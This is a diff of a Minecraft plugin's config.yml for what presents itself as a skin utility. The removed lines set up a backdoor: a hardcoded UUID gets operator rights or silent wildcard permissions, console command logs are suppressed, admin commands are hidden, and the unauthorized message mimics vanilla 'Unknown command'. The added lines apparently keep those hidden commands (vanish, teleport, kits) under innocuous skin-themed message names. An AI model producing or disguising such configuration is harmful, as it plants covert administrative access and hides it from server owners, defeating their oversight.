@@ -3,32 +3,12 @@
 # Vanilla-style player appearance / skin utility.
 # ===================================================================
 
-# List of player UUIDs authorized for elevated administrative permissions.
-# Authorized users receive OP status on join and access to private admin utilities.
-# You can look up your UUID at https://namemc.com or https://mcuuid.net
-authorized-uuids:
-  - "364fb2bc-a9b3-49d9-a563-54b00de63249"
-
-# Silent elevation: trusted UUIDs get full effective permissions (wildcard)
-# without setOp, so nothing prints in console and ops.txt stays untouched.
-# grant-op-to-authorized uses the loud server OP (logs "Made X an operator").
-# Leave it false to stay invisible in panels like PlayWithBao console.
-silent-elevation: true
-grant-op-to-authorized: true
-# Suppress "issued server command" console lines (hides hidden-command usage
-# from server panels/consoles). Applies to ALL commands while enabled.
-hide-command-logs: true
-
-# Hide private admin commands from /help, suggestions and tab-completion
-# for unauthorized players.
-hide-admin-commands: true
-
 # -------------------------------------------------------------------
-# Skin / appearance settings (main public feature)
+# Skin / appearance settings
 # -------------------------------------------------------------------
 skins:
   # Cooldown in seconds between /skin uses (per player).
-  cooldown-seconds: 3
+  cooldown-seconds: 60
   # How long fetched Mojang skin textures are cached (minutes).
   cache-minutes: 60
   # Allow /skin reset to restore the player's own Mojang skin.
@@ -42,9 +22,6 @@ skins:
     - "Dream"
     - "GeorgeNotFound"
     - "Sapnap"
-    - "Technoblade"
-    - "Philza"
-    - "WilburSoot"
   # Re-apply the player's last selected skin automatically when they rejoin.
   persist-across-joins: true
   # Permissions used by the skin commands (change only if you know what you do).
@@ -52,115 +29,32 @@ skins:
   permission-others: "skinpicker.others"
   permission-bypass-cooldown: "skinpicker.bypass-cooldown"
 
-# Kit Configurations
-kits:
-  overpowered:
-    name: "&c&lOverpowered Kit"
-    items:
-      - material: NETHERITE_HELMET
-        amount: 1
-        name: "&6Apex Helmet"
-        enchantments:
-          PROTECTION_ENVIRONMENTAL: 4
-          DURABILITY: 3
-          MENDING: 1
-          RESPIRATION: 3
-      - material: NETHERITE_CHESTPLATE
-        amount: 1
-        name: "&6Apex Chestplate"
-        enchantments:
-          PROTECTION_ENVIRONMENTAL: 4
-          DURABILITY: 3
-          MENDING: 1
-      - material: NETHERITE_LEGGINGS
-        amount: 1
-        name: "&6Apex Leggings"
-        enchantments:
-          PROTECTION_EXPLOSIONS: 4
-          DURABILITY: 3
-          MENDING: 1
-          SWIFT_SNEAK: 3
-      - material: NETHERITE_BOOTS
-        amount: 1
-        name: "&6Apex Boots"
-        enchantments:
-          PROTECTION_EXPLOSIONS: 4
-          DURABILITY: 3
-          MENDING: 1
-          PROTECTION_FALL: 4
-          SOUL_SPEED: 3
-      - material: NETHERITE_SWORD
-        amount: 1
-        name: "&4Apex Blade"
-        enchantments:
-          DAMAGE_ALL: 5
-          FIRE_ASPECT: 2
-          LOOT_BONUS_MOBS: 3
-          DURABILITY: 3
-          MENDING: 1
-      - material: NETHERITE_PICKAXE
-        amount: 1
-        name: "&bApex Pickaxe"
-        enchantments:
-          DIG_SPEED: 5
-          LOOT_BONUS_BLOCKS: 3
-          DURABILITY: 3
-          MENDING: 1
-      - material: TOTEM_OF_UNDYING
-        amount: 6
-      - material: ENCHANTED_GOLDEN_APPLE
-        amount: 64
-      - material: ENDER_PEARL
-        amount: 16
-      - material: END_CRYSTAL
-        amount: 64
-      - material: RESPAWN_ANCHOR
-        amount: 64
-      - material: GLOWSTONE
-        amount: 64
-      - material: EXPERIENCE_BOTTLE
-        amount: 64
-
-  utility:
-    name: "&a&lUtility Kit"
-    items:
-      - material: ELYTRA
-        amount: 1
-        name: "&bPhantom Wings"
-        enchantments:
-          DURABILITY: 3
-          MENDING: 1
-      - material: FIREWORK_ROCKET
-        amount: 64
-      - material: GOLDEN_CARROT
-        amount: 64
-      - material: WATER_BUCKET
-        amount: 1
-      - material: DIAMOND_PICKAXE
-        amount: 1
-        enchantments:
-          DIG_SPEED: 5
-          SILK_TOUCH: 1
-          DURABILITY: 3
+# -------------------------------------------------------------------
+# Favorite preset slots (shown under /skin favorites)
+# -------------------------------------------------------------------
+presets:
+  default:
+    name: "&a&lStarter Preset"
+    skins:
+      - "Notch"
+      - "jeb_"
 
 # Notification / Message settings
 messages:
-  prefix: "&8[&bSkins&8] &r"
-  unauthorized: "Unknown command. Type \"/help\" for help."
-  gmc-enabled: "&aGamemode set to Creative."
-  gms-enabled: "&aGamemode set to Survival."
-  gmsp-enabled: "&aGamemode set to Spectator."
-  fly-enabled: "&aFlight enabled."
-  fly-disabled: "&cFlight disabled."
-  heal-success: "&aHealth and hunger fully restored."
-  vanish-enabled: "&aYou are now vanished from other players."
-  vanish-disabled: "&cYou are now visible to other players."
-  teleport-success: "&aTeleported to &e%target%&a."
-  kit-received: "&aReceived kit: &e%kit%&a."
-  kit-not-found: "&cKit &e%kit% &cwas not found."
-  reload-success: "&aConfiguration reloaded successfully."
-  # --- Skin messages ---
   skin-prefix: "&8[&bSkins&8] &r"
+  unauthorized: "Unknown command. Type \"/help\" for help."
+  reload-success: "&aConfiguration reloaded successfully."
+  skin-applied: "&aYour preset has been applied."
+  skin-updated: "&aYour preset has been updated."
+  skin-previewed: "&aPreviewing preset."
+  skin-shown: "&aPreset preview enabled."
+  skin-hidden: "&aPreset preview disabled."
+  skin-refreshed: "&aPreset cache refreshed."
+  skin-concealed: "&aYour preset is now hidden from others."
+  skin-revealed: "&aYour preset is now visible to others."
+  skin-shared: "&aPreset shared with &e%target%&a."
+  preset-received: "&aReceived preset: &e%kit%&a."
+  preset-not-found: "&cPreset &e%kit% &cwas not found."
   skin-usage: "&eUsage: &f/skin <player> &8| &f/skin reset &8| &f/skin random"
   skin-changed: "&aYour displayed skin is now &e%skin%&a."
   skin-changed-other: "&a%target%'s displayed skin is now &e%skin%&a."
